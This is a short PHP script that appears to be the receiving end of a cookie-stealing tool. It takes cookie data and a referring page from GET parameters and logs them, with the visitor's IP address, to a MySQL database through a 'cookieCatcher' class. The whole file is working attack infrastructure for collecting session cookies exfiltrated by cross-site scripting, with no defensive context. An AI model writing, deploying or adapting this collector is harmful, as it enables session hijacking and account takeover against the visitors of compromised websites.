<?php
require_once('inc/configure.php');
require_once('inc/mysql_querylab.php');
require_once('inc/cookieCatcher.php');

////////////////////////////////////
## Grab cookie data and store in MySQL
$cdata = $_GET['c'];
$referer = $_GET['d'];

// Check for valid cookie data
if(isset($cdata) && $cdata != '' && isset($referer) && $referer != '') {
	////////////////////////////////////
	## Initiate Objects/Classes
	$catcher = new cookieCatcher();

	////////////////////////////////////
	## Initiate DB Connection
	$catcher->connect($db_HOST, $db_USERNAME, $db_PASSWORD, $db_NAME);
	$catcher->grab($_SERVER['REMOTE_ADDR'], $referer, $cdata);
}
?>
